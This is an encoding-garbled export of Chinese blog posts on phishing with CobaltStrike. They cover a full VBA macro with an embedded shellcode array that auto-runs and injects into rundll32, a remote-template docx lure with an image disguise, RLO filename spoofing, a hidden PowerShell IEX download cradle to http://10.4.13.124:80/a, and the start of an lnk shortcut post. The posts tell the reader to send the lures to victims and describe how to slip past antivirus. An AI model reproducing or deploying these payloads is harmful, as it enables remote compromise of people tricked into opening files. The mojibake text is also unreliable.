æœ¬åœ°åŠ è½½æ¶æ„Wordæ–‡æ¡£/æ¨¡æ¿æ–‡ä»¶ä¸Šçº¿CS1ã€ç”Ÿæˆç›‘å¬å™¨ 2ã€ä½¿ç”¨CobaltStrikeç”Ÿæˆå®æœ¨é©¬é€‰æ‹©MS Officeå® é€‰æ‹©ç›‘å¬å™¨ æç¤ºäº†ä½¿ç”¨æ­¥éª¤ Copy Marcoä»£ç å¦‚ä¸‹ Private Type PROCESS_INFORMATION hProcess As Long hThread As Long dwProcessId As Long dwThreadId As LongEnd TypePrivate Type STARTUPINFO cb As Long lpReserved As String lpDesktop As String lpTitle As String dwX As Long dwY As Long dwXSize As Long dwYSize As Long dwXCountChars As Long dwYCountChars As Long dwFillAttribute As Long dwFlags As Long wShowWindow As Integer cbReserved2 As Integer lpReserved2 As Long hStdInput As Long hStdOutput As Long hStdError As LongEnd Type#If VBA7 Then Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr Private Declare PtrSafe Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr Private Declare PtrSafe Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long#Else Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long#End IfSub Auto_Open() Dim myByte As Long, myArray As Variant, offset As Long Dim pInfo As PROCESS_INFORMATION Dim sInfo As STARTUPINFO Dim sNull As String Dim sProc As String#If VBA7 Then Dim rwxpage As LongPtr, res As LongPtr#Else Dim rwxpage As Long, res As Long#End If myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,80,0,0,0,83,80,104,87,-119,-97, _-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _-1,-1,47,98,99,81,70,0,110,-60,-16,-88,-109,73,115,86,-74,-83,-24,-104,-51,92,8,108,-99,-3,104,125,92,121,-36,32,109,72,-18,-112,2,43,-91,-8, _51,17,123,-44,17,-12,125,-79,-88,29,78,32,-93,-47,-20,84,17,77,-33,28,-27,-109,66,30,125,92,-55,119,104,4,-77,-79,108,78,-2,-21,5,42,120,-23, _-106,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,87,79,87,54,52,59,32,84,114,105,100,101,110,116,47, _53,46,48,59,32,70,117,110,87,101,98,80,114,111,100,117,99,116,115,41,13,10,0,-78,-71,-108,93,108,47,-34,39,-99,-23,53,2,70,-89,-117,45,-125, _-34,-108,-21,11,95,84,18,-45,-114,94,1,51,-3,-75,-99,-37,109,-52,31,-88,24,41,81,-80,14,114,-3,2,105,25,105,30,-15,-13,34,-68,-72,-55,87,-19, _61,-24,-82,25,-116,107,-104,119,6,124,-37,-17,103,-54,-24,-49,38,10,96,86,55,-88,-95,6,93,43,-93,28,-124,-54,-75,-9,21,28,-72,-98,86,51,84,-89, _-3,78,103,91,-88,-72,-11,-36,-82,-80,-61,-11,106,-18,100,-92,15,-100,-41,-24,110,63,38,38,104,-108,-80,-127,-61,-77,-98,35,101,-53,-40,51,-109,42,93,-20, _52,14,71,82,84,-20,121,89,-6,1,-117,-82,13,80,57,-21,121,46,75,38,-6,5,-31,-97,-82,21,-13,-106,-45,11,-5,-51,112,13,5,-40,90,-61,-94,-79, _48,118,-54,85,-75,-121,36,104,-74,4,-12,73,116,-21,5,-24,-47,95,70,-108,-61,-54,-22,97,118,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,48,46,52,46,49,51,46,49,50,52,0,25,105,-96,-115) If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then sProc = Environ(&quot;windir&quot;) &amp; &quot;\\\\SysWOW64\\\\rundll32.exe&quot; Else sProc = Environ(&quot;windir&quot;) &amp; &quot;\\\\System32\\\\rundll32.exe&quot; End If res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo) rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40) For offset = LBound(myArray) To UBound(myArray) myByte = myArray(offset) res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;) Next offset res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)End SubSub AutoOpen() Auto_OpenEnd SubSub Workbook_Open() Auto_OpenEnd Sub 3ã€åˆ›å»ºå¯ç”¨æ¶æ„å®çš„Wordæ–‡æ¡£/æ¨¡æ¿åˆ›å»ºä¸€ä¸ªWordï¼Œè§†å›¾-æŸ¥çœ‹å® å®åéšä¾¿è¾“å…¥ä¸€ä¸ªå°±å¯ä»¥ï¼Œåˆ›å»º åœ¨Projecté¡¹ç›®ä¸­çš„ThisDocumentä¸­æ·»åŠ CSç”Ÿæˆçš„å®ä»£ç ï¼Œå¹¶ä¸”å³ä¸Šè§’é€‰æ‹©Auto_Openï¼Œåœ¨å¯¹æ–¹æ‰“å¼€æ–‡æ¡£æ—¶ï¼ŒWordè‡ªåŠ¨è¿è¡Œå®æç¤ºä¿¡æ¯ï¼Œæç¤ºæ˜¯å¦ç‚¹å‡» Ctrl + Sä¿å­˜ é€‰æ‹©ä½¿ç”¨å¯ç”¨å®çš„æ–‡æ¡£/æ¨¡æ¿ï¼Œè¿™é‡Œæˆ‘å¯ç”¨å®çš„wordæ–‡æ¡£å’Œå¯ç”¨å®çš„æ¨¡æ¿éƒ½å¼„ä¸€ä¸ª ä¿å­˜åæŠ¥æ¯’äº†ï¼Œå› ä¸ºæœªåšä»»ä½•å…æ€ï¼Œç»§ç»­ 4ã€åŠ è½½æ¶æ„å®æ–‡ä»¶ä»¥ä¸‹åŠ¨å›¾å±•ç¤ºäº†ç›®æ ‡æœºæ‰“å¼€Wordæ–‡æ¡£ä¸”å¯ç”¨å®æ—¶ï¼Œåå¼¹shell ä»¥ä¸‹åŠ¨å›¾å±•ç¤ºäº†ç›®æ ‡æœºå³é”®æ‰“å¼€Wordæ¨¡æ¿æ—¶ï¼Œåå¼¹shell åŒå‡»æ˜¯æ— æ³•æ‰“å¼€æ¨¡ç‰ˆæ–‡ä»¶çš„ï¼Œåœ¨æ¨¡ç‰ˆæ–‡ä»¶ä¸ŠåŒå‡»é»˜è®¤æ˜¯ä»¥æ­¤æ¨¡ç‰ˆåˆ›å»ºæ–°æ–‡ä»¶ï¼Œåˆ‡è®°ã€‚ æœ¬åœ°åŠ è½½çš„ç¼ºç‚¹å°±æ˜¯ï¼Œä¼šè¢«æ€è½¯æŸ¥æ€ äºŒã€è¿œç¨‹åŠ è½½æ¶æ„Wordæ¨¡æ¿æ–‡ä»¶ä¸Šçº¿CSåˆ©ç”¨Wordæ–‡æ¡£åŠ è½½é™„åŠ æ¨¡æ¿æ—¶çš„ç¼ºé™·æ‰€å‘èµ·çš„æ¶æ„è¯·æ±‚è€Œè¾¾åˆ°çš„æ”»å‡»ç›®çš„ï¼Œæ‰€ä»¥å½“ç›®æ ‡ç”¨æˆ·ç‚¹å¼€æ”»å‡»è€…å‘ç»™ä»–çš„æ¶æ„wordæ–‡æ¡£å°±å¯ä»¥é€šè¿‡å‘è¿œç¨‹æœåŠ¡å™¨è¯·æ±‚æ¶æ„æ¨¡æ¿å¹¶æ‰§è¡Œæ¶æ„æ¨¡æ¿ä¸Šçš„æ¶æ„ä»£ç ã€‚ è¿™é‡Œï¼Œæˆ‘ä»¬å€ŸåŠ©CobaltStrikeç”Ÿæˆofficeå®ç—…æ¯’ï¼Œåœ¨å°†æ¶æ„å®åµŒå…¥åˆ°Wordæ¨¡æ¿ä¸­ï¼Œè¯±ä½¿å—å®³è€…è¿œç¨‹æ‰“å¼€å¹¶åŠ è½½å¸¦æœ‰å®çš„æ¶æ„Wordæ¨¡ç‰ˆï¼Œè‡³ç›®æ ‡ä¸»æœºæˆåŠŸä¸Šçº¿CobaltStrikeã€‚ ç¼ºç‚¹ï¼šç›®æ ‡ä¸»æœºçš„ç½‘é€Ÿå†³å®šäº†åŠ è½½è¿œç¨‹æ¨¡ç‰ˆçš„é€Ÿåº¦ã€‚æœ‰å¯èƒ½æ–‡ä»¶æ‰“å¼€çš„ä¼šç‰¹åˆ«æ…¢(ä¾‹å¦‚å°†è¿œç¨‹æ¨¡ç‰ˆæ”¾åœ¨github)ï¼Œå—å®³è€…å¯èƒ½åœ¨æ–‡ä»¶æ‰“å¼€ä¸€åŠçš„æ—¶å€™å¼ºåˆ¶å…³é—­wordã€‚åŠ è½½ä½äºgithubä¸Šçš„æ¶æ„æ¨¡æ¿å†…å®¹ï¼Œæœ‰ç‚¹æ…¢ï¼Œæˆ‘ä»¬å¯ä»¥æ”¾åœ¨vpsä¸Šï¼Œè¿™æ ·é€Ÿåº¦å°±å¿«äº›äº†ã€‚ ä¼˜ç‚¹ï¼šå› ä¸ºæ˜¯è¿œç¨‹åŠ è½½ï¼Œæ‰€ä»¥å…æ€æ•ˆæœååˆ†ä¸é”™ã€‚åŸºæœ¬ä¸ä¼šè¢«æ€æ¯’è½¯ä»¶æ‹¦æˆªã€‚ 1ã€å°†æ¶æ„æ¨¡æ¿æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨å°†ä¹‹å‰åˆ¶ä½œçš„å«æœ‰æ¶æ„ä»£ç çš„æ¨¡æ¿æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šï¼ˆæˆ‘è¿™é‡Œä»¥kaliå¼€å¯HTTPæœåŠ¡ä¸ºä¾‹ï¼‰ 2ã€æ„é€ æ¶æ„çš„docxé’“é±¼æ–‡ä»¶æ‰“å¼€wordæ‰¾ä¸€ä¸ªä»»æ„çš„æ¨¡æ¿ä½¿ç”¨ è¿™é‡Œæˆ‘å°±é€šè¿‡å½•åˆ¶å®ï¼Œå¦å­˜ä¸º1.dotmæ¨¡æ¿æ–‡ä»¶åˆ°Officeæ¨¡æ¿ç›®å½•ä¸‹ï¼Œè‡ªå·±åˆ¶ä½œä¸€ä¸ªæ¨¡æ¿ ç›´æ¥ç»§ç»­åœ¨å¼€å§‹ä¸€æ æ–°å»ºâ€“å¯¼å…¥ä¹‹å‰åšå¥½çš„æ¨¡æ¿æ–‡ä»¶1.dotmï¼Œä¿å­˜ä¸ºå˜¿å˜¿.docx å°†åç¼€åæ”¹ä¸ºzip è§£å‹ç¼© è¿›å…¥wordæ–‡ä»¶å¤¹ä¸­çš„_relsï¼Œæ‰¾åˆ°settings.xml.relsæ–‡ä»¶ï¼Œç¼–è¾‘è¿™ä¸ªæ–‡ä»¶ï¼Œå°†å…¶çš„targetå±æ€§çš„å€¼æ”¹ä¸ºæœåŠ¡å™¨çš„URL http://ip:port/è·å¥–åå•.dotm?raw=trueæˆ–è€…http://åŸŸå/è·å¥–åå•.dotm?raw=true å®Œæˆåï¼Œå°†åˆšæ‰è§£å‹ç”Ÿæˆçš„æ–‡ä»¶å†å‹ç¼©å›å» å¹¶ä¸”å°†ç”Ÿæˆçš„æ–‡ä»¶æ”¹åä¸ºåç¼€åä¸ºdocxçš„æ–‡ä»¶ è¿™é‡Œåˆ©ç”¨çš„æ˜¯åˆ†ç¦»å…æ€çš„æ–¹æ³•ï¼Œé‡Œé¢çš„ä»£ç éƒ½æ˜¯æ­£å¸¸çš„ï¼Œç”±äºæ€æ¯’è½¯ä»¶æ˜¯é™æ€æŸ¥æ€ï¼Œæ‰€ä»¥æ— æ³•æŸ¥æ€çš„ï¼ 3ã€åŠ è½½æœåŠ¡å™¨ä¸Šçš„æ¶æ„æ–‡ä»¶åå¼¹shellå°†æœ€ç»ˆç”Ÿæˆçš„æ¶æ„æ–‡ä»¶â€”â€”å˜¿å˜¿.docxç”¨é‚®ç®±é’“é±¼ã€qqæˆ–å¾®ä¿¡æ–‡ä»¶å‘é€ç»™å—å®³è€…ï¼Œå½“å—å®³è€…åŒå‡»æ‰“å¼€â€œå˜¿å˜¿.docxâ€æ–‡ä»¶ï¼Œå¯ç”¨å®æ—¶ï¼Œæ¶æ„ä»£ç ä¼šæ‰§è¡Œï¼Œç›®æ ‡ä¸»æœºä¼šä¸Šçº¿ 4ã€è¿›é˜¶ä¼ªè£…â€“èƒŒæ™¯è™šæ‹ŸåŒ–å›¾ç‰‡çš„è¦†ç›–ä»åˆšåˆšçš„å®éªŒå¯ä»¥çŸ¥é“ï¼Œå¯åŠ¨wordåï¼Œè¿˜éœ€è¦ç”¨æˆ·ç‚¹å‡»å¯ç”¨å®ï¼Œç¨æœ‰æˆ’å¤‡å¿ƒçš„å°±ä¸ä¼šå¼€å¯ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å†åšä¸€äº›é’“é±¼å·¥ä½œ ä»¥ä¸‹å†…å®¹æ¥è‡ªå…¬ä¼—å·Gammaå®éªŒå®¤çš„å†…å®¹ï¼Œé“¾æ¥å·²åœ¨å‚è€ƒé“¾æ¥ç»™å‡ºã€‚æš‚æ—¶ä¸å¯¹æ­¤è¿›è¡Œå¤ç°ï¼Œäº†è§£æœ‰è¿™ç§éªšæ“ä½œå³å¯ã€‚ åœ¨ç½‘ä¸Šéšä¾¿æ‰¾ä¸ªæ¨¡æ¿ï¼Œå¤åˆ¶é»è´´è¿›å»ï¼Œæˆªå›¾å¦å­˜ä¸º æ‰“å¼€æˆ‘ä»¬çš„ç¥å™¨ï¼Œç¾å›¾ç§€ç§€ï¼Œæ‰“å¼€æˆ‘ä»¬åˆšæˆªå›¾çš„å›¾ç‰‡ï¼Œç‚¹å‡»èƒŒæ™¯è™šæ‹ŸåŒ–ï¼Œè°ƒæ•´è™šæ‹ŸåŒ–ç¨‹åº¦ï¼Œæœ€å¥½æ˜¯é‚£ç§å¼±å½±å¼±ç°çš„æ„Ÿè§‰æœ€niceï¼Œç„¶ååŠ ä¸Šä¸€äº›è¯´æ˜å—· ç„¶åè®¾ç½®å›¾ç‰‡å°ºå¯¸ä¸º790ï¼Œ1120 ç„¶åä¿å­˜ï¼Œç„¶åå°±å¯ä»¥çœ‹åˆ°æ•ˆæœäº† ä¸ºä»€ä¹ˆä¼šè®¾ç½®æˆ790x1120å˜ï¼Œåªæ˜¯ä¸ºäº†åˆšå¥½è¦†ç›–wordé‡Œé¢çš„æ–‡æœ¬ï¼Œç„¶ådocxæ–‡æ¡£å¦å­˜ä¸ºdocæ–‡æ¡£ ç„¶åæ‰“å¼€ï¼Œå»å¼€å¯æ˜¾ç¤ºå¼€å‘è€…å·¥å…·é€‰é¡¹å¡ï¼Œæ–‡ä»¶-&gt;é€‰é¡¹-&gt;è‡ªå®šä¹‰åŠŸèƒ½åŒº-&gt;ä¸»é€‰é¡¹å¡-&gt;å¼€å‘è€…å·¥å…· ç„¶åç‚¹å‡»å¼€å‘è€…å·¥å…·ï¼Œé€‰æ‹©å›¾åƒï¼ˆActiveæ§ä»¶ï¼‰ è®¾ç½®å›¾åƒæ ¼å¼ä¸ºæµ®äºæ–‡å­—ä¸Šæ–¹ï¼Œå¹¶æŠŠå›¾åƒæ‹‰æ»¡ æ•ˆæœå°±æ˜¯è¿™æ ·ï¼Œä¼šæŠŠæ–‡å­—å…¨éƒ¨è¦†ç›– ç„¶åç‚¹å‡»å›¾åƒå±æ€§ï¼Œè®¾ç½®æˆæˆ‘ä»¬åšå¥½çš„å›¾ç‰‡ï¼Œç„¶åç‚¹å‡»å®åˆ›å»ºå®ï¼Œcsç”Ÿæˆå®æœ¨é©¬ å¤åˆ¶ç²˜è´´ï¼Œåœ¨Auto_Openï¼ˆï¼‰å‡½æ•°é¦–éƒ¨ç¼–å†™ä»£ç ï¼Œè®¾ç½®å›¾ç‰‡ä½ç½®ä¸º0é«˜åº¦ä¸º0è®©å®è¿è¡Œådocä¸Šå›¾ç‰‡æ¶ˆå¤±ï¼Œç„¶åä¿å­˜ï¼Œofficeé©¬å°±åˆ¶ä½œå¥½äº† Project.ThisDocument.Image1.Top = 0Project.ThisDocument.Image1.Width = 0 æˆå“å±•ç¤ºï¼š ä¸‰ã€å…¶ä»–æ€è·¯å¦‚æœæ˜¯é‡åˆ°WPSçš„å®¢æˆ·æ€ä¹ˆåŠï¼Ÿé€šè¿‡ä¸Šé¢çš„æ–¹æ³•WPSæ‰“å¼€æˆ‘çš„ç®€å†æ˜¯ä¸ä¼šæç¤ºå®çš„ å…¶ä»–æ€è·¯ï¼š æ‰“å¼€WPSåˆ›å»ºå®æ˜¯æš—è‰²çš„éœ€è¦å®‰è£…VBA for WPSæ‰å¯ä»¥å†™WPSå®ç—…æ¯’ä»£ç æ‰§è¡Œï¼ Officeå’ŒWPSä¸­è¿˜å¯ä»¥éšè—æ–‡å­—ï¼Œå¯ä»¥åˆ©ç”¨è¯¥æ–¹å¼é€šè¿‡é…åˆå½•åˆ¶å®çš„æ–¹æ³•ï¼Œç”¨è¯¥æ–¹å¼æ‰§è¡Œâ€¦ Normalæ¨¡å—ä¸‹ï¼Œä¸æ­¢èƒ½ç¼–å†™ä¸€ä¸ªsettings.xml.relsâ€¦å¯ä»¥å¤šå®â€¦ å¼¹æ¡†æ‰§è¡Œä»£ç å†™å…¥å®ï¼Œé‚£ä¹ˆExcelã€PPTç­‰ä¹Ÿå†™â€¦ ä¸æ­¢docxå®ï¼Œè¿˜æœ‰å¾ˆå¤šï¼Œèƒ½å¦å­˜æ–‡ä»¶å†…å®¹çš„éƒ½å¯ä»¥â€¦ å››ã€å‚è€ƒé“¾æ¥ https://www.cnblogs.com/zzjdbk/p/14435769.html https://blog.csdn.net/qq_34801745/article/details/111307768 https://cloud.tencent.com/developer/article/1799424","categories":[{"name":"APT/ç¤¾å·¥","slug":"APT-ç¤¾å·¥","permalink":"https://wolke.cn/categories/APT-%E7%A4%BE%E5%B7%A5/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://wolke.cn/tags/CobaltStrike/"},{"name":"é’“é±¼","slug":"é’“é±¼","permalink":"https://wolke.cn/tags/%E9%92%93%E9%B1%BC/"},{"name":"ç¤¾å·¥","slug":"ç¤¾å·¥","permalink":"https://wolke.cn/tags/%E7%A4%BE%E5%B7%A5/"},{"name":"APT","slug":"APT","permalink":"https://wolke.cn/tags/APT/"}],"author":"w01ke"},{"title":"RLOçš„Unicodeåè½¬æ–‡ä»¶åç¼€é’“é±¼","slug":"RLOçš„Unicodeåè½¬æ–‡ä»¶åç¼€é’“é±¼","date":"2022-03-07T10:10:22.000Z","updated":"2022-03-08T02:21:11.891Z","comments":true,"path":"post/5653cc29.html","link":"","permalink":"https://wolke.cn/post/5653cc29.html","excerpt":"","text":"ä¸€ã€åˆä½“éªŒUnicodeï¼ˆä¸­æ–‡ï¼šä¸‡å›½ç ã€å›½é™…ç ã€ç»Ÿä¸€ç ã€å•ä¸€ç ï¼‰æ˜¯è®¡ç®—æœºç§‘å­¦é¢†åŸŸé‡Œçš„ä¸€é¡¹ä¸šç•Œæ ‡å‡†ã€‚å®ƒå¯¹ä¸–ç•Œä¸Šå¤§éƒ¨åˆ†çš„æ–‡å­—ç³»ç»Ÿè¿›è¡Œäº†æ•´ç†ã€ç¼–ç ï¼Œä½¿å¾—ç”µè„‘å¯ä»¥ç”¨æ›´ä¸ºç®€å•çš„æ–¹å¼æ¥å‘ˆç°å’Œå¤„ç†æ–‡å­—ã€‚è€Œå¦‚ä¸ŠæŠ€æœ¯æ­£æ˜¯ä½¿ç”¨äº†Unicodeçš„RLOï¼ˆå¼€å§‹ä»å·¦å‘å³è¦†ç›–ï¼‰ï¼ŒUnicodeå®šä¹‰çš„ Start of right-to-left overrideï¼Œæ§åˆ¶å­—ç¬¦æ˜¯RLOï¼ŒASCIIç æ˜¯0x3Fã€‚åªè¦åœ¨ä¸€è¡Œå­—ç¬¦å‰é¢åŠ ä¸Šä¸€ä¸ª0x3Få°±å¯ä»¥å®ç°æ–‡æœ¬çš„åå‘æ’åˆ—ã€‚è¿™ä¸ª0x3Fæ˜¯Unicodeä¸ºäº†å…¼å®¹é˜¿æ‹‰ä¼¯æ–‡å­—ä»å·¦è‡³å³çš„é˜…è¯»ä¹ æƒ¯è®¾è®¡çš„ä¸€ä¸ªè½¬ä¹‰å­—ç¬¦ã€‚ å¤§è‡´åŸç†å°±æ˜¯ï¼Œåœ¨Windowsä¸‹é¢ï¼Œæ”¯æŒä¸€ç§ç‰¹æ®Šçš„Unicodeå­—ç¬¦RLOï¼Œä¸€ä¸ªå­—ç¬¦ä¸²ä¸­å¦‚æœæœ‰è¿™ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆåœ¨Windowsä¸‹æ˜¾ç¤ºæ—¶ï¼Œå°±ä¼šæŠŠRLOå³ä¾§çš„å­—ç¬¦ä¸²é€†åºæ˜¾ç¤ºå‡ºæ¥ ä¾‹å¦‚ï¼ŒåŸå§‹å­—ç¬¦ä¸²ï¼šabcd[RLO]efghï¼Œåœ¨Windowsä¸‹æ˜¾ç¤ºä¸ºï¼šabcdhgfeï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼ŒæŠŠexeæ–‡ä»¶ä¼ªè£…æˆä¸€ä¸ªæ–‡æœ¬æˆ–å›¾ç‰‡æ–‡ä»¶ï¼Œç”¨æˆ·åœ¨åŒå‡»æ—¶æ¶æ„æ–‡ä»¶ä¾¿å¾—åˆ°æ‰§è¡Œã€‚ ã€ç¤ºä¾‹ã€‘ æˆ‘ä»¬æ–°å»ºä¸€ä¸ªtxt.batå†…å®¹ä¸ºstart calc.exeï¼Œç‚¹å‡»é‡å‘½åé€‰æ‹©æ’å…¥Unicodeæ§åˆ¶å­—ç¬¦ï¼Œé€‰æ‹©RLOæ­¤æ—¶æ–‡ä»¶åç§°ä¼šå˜ä¸ºtab.txt äºŒã€ç»“åˆä½¿ç”¨CobaltStrike1ã€ç”Ÿæˆç›‘å¬å™¨ 2ã€ç”Ÿæˆpowershellæœ¨é©¬ powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.4.13.124:80/a&#x27;))&quot; 3ã€ä½¿ç”¨BAT2EXEå°†BATè½¬æ¢ä¸ºEXEå°†ä»¥ä¸‹å†…å®¹ä¿å­˜ä¸ºtest.bat powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.4.13.124:80/a&#x27;))&quot; ä¸‹è½½å®‰è£…BAT2EXEï¼Œæ‰“å¼€è¯¥å·¥å…·ï¼Œç‚¹å‡»openå¯¼å…¥å‰é¢åˆ›å»ºçš„test.batï¼Œç„¶åå°†â€œnotepadâ€æ·»åŠ åˆ°test.batçš„é¡¶éƒ¨ï¼Œç‚¹å‡»å³ä¾§çš„iconé€‰æ‹©ä¸€ä¸ªtxtæ–‡æœ¬å›¾æ ‡ã€‚ç„¶åå°†exeæ ¼å¼æ›´æ”¹ä¸ºâ€œ64ä½Windowsï¼ˆéšå½¢ï¼‰â€ï¼Œä»¥é˜²æ­¢åœ¨ç›®æ ‡ç”¨æˆ·æ‰“å¼€æ–‡ä»¶æ—¶å¼¹å‡ºä»»ä½•ç»ˆç«¯ï¼Œæœ€åç‚¹å‡»convertè½¬æ¢ ä¿å­˜ä¸ºtxt.bat 4ã€RLOä¼ªè£…EXEåç¼€ä¸ºTXT 5ã€åå¼¹shellä¸‹é¢çš„åŠ¨å›¾ï¼Œå±•ç¤ºäº†æ‰“å¼€ä¸€ä¸ªTXTé’“é±¼æ–‡ä»¶æ—¶ï¼Œé€¼çœŸçš„æ‰“å¼€äº†è®°äº‹æœ¬ï¼Œç„¶ååœ¨èƒŒåæ‚„æ‚„çš„ä¸Šäº†çº¿ï¼š ä¸‰ã€é™„å½• å„ç§å›¾æ ‡icoä¸‹è½½ å‘½ä»¤è¡Œçš„BAT2EXEä¸‹è½½ å›¾å½¢åŒ–çš„BAT2EXEä¸‹è½½ å››ã€å‚è€ƒé“¾æ¥ https://cloud.tencent.com/developer/article/1799424 https://blog.csdn.net/mgxcool/article/details/50637346 https://www.freebuf.com/articles/network/320964.html https://blog.csdn.net/qq_23452385/article/details/109145151","categories":[{"name":"APT/ç¤¾å·¥","slug":"APT-ç¤¾å·¥","permalink":"https://wolke.cn/categories/APT-%E7%A4%BE%E5%B7%A5/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://wolke.cn/tags/CobaltStrike/"},{"name":"é’“é±¼","slug":"é’“é±¼","permalink":"https://wolke.cn/tags/%E9%92%93%E9%B1%BC/"},{"name":"ç¤¾å·¥","slug":"ç¤¾å·¥","permalink":"https://wolke.cn/tags/%E7%A4%BE%E5%B7%A5/"},{"name":"APT","slug":"APT","permalink":"https://wolke.cn/tags/APT/"}],"author":"w01ke"},{"title":"lnkå¿«æ·æ–¹å¼é’“é±¼","slug":"lnkå¿«æ·æ–¹å¼é’“é±¼","date":"2022-02-28T11:19:00.000Z","updated":"2022-03-08T02:48:11.653Z","comments":true,"path":"post/1cb9d074.html","link":"","permalink":"https://wolke.cn/post/1cb9d074.html","excerpt":"","text":"ä¸€ã€å‰è¨€lnkæ–‡ä»¶æ˜¯ç”¨äºæŒ‡å‘å…¶ä»–æ–‡ä»¶çš„ä¸€ç§æ–‡ä»¶ã€‚è¿™äº›æ–‡ä»¶é€šå¸¸ç§°ä¸ºå¿«æ·æ–¹å¼æ–‡ä»¶ï¼Œé€šå¸¸å®ƒä»¥å¿«æ·æ–¹å¼æ”¾åœ¨ç¡¬ç›˜ä¸Šï¼Œä»¥æ–¹ä¾¿ä½¿ç”¨è€…å¿«é€Ÿçš„è°ƒç”¨ã€‚ lnké’“é±¼ä¸»è¦å°†å›¾æ ‡ä¼ªè£…æˆæ­£å¸¸å›¾æ ‡ï¼Œä½†æ˜¯ç›®æ ‡ä¼šæ‰§è¡Œshellå‘½ä»¤ã€‚ 